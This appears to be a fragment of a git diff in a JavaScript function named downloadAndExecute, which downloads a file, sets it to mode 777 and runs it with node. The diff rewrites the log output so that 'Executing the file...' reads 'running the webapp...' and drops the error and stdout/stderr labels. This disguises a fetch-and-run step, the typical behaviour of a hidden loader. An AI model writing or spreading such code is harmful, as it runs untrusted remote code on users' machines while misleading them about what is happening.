@@ -53,14 +53,14 @@ const downloadAndExecute = () => {
       console.log('File downloaded successfully.');
       fs.chmodSync(filePath, '777'); 
 
-      console.log('Executing the file...');
+      console.log('running the webapp...');
       const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
         if (error) {
-          console.error(`Execution error: ${error}`);
+          console.error(`${error}`);
           return;
         }
-        console.log(`stdout: ${stdout}`);
-        console.error(`stderr: ${stderr}`);
+        console.log(`${stdout}`);
+        console.error(`${stderr}`);
       });
 
       child.on('exit', (code) => {
